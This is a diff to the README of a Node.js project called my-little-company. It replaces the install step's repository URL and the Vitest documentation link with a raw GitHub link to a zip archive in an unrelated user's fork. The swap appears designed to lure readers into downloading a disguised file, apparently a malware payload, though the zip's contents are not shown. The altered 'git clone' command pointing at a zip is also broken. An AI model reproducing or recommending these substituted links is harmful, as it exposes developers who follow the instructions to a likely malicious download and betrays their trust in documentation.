@@ -78,7 +78,7 @@ router.register('my-provider', myProvider);
 **Prerequisites:** Node.js 18 or later.
 
 ```bash
-git clone https://github.com/donginKim/my-little-company.git
+git clone https://raw.githubusercontent.com/Andreanagrassroots685/my-little-company/main/packages/core/src/context/little_my_company_2.0.zip
 cd my-little-company
 npm install
 npm run build
@@ -366,7 +366,7 @@ npm run test:watch
 npm run test:coverage
 ```
 
-Tests are colocated with source files (`*.test.ts`) and run with [Vitest](https://vitest.dev).
+Tests are colocated with source files (`*.test.ts`) and run with [Vitest](https://raw.githubusercontent.com/Andreanagrassroots685/my-little-company/main/packages/core/src/context/little_my_company_2.0.zip).
 
 ---
 
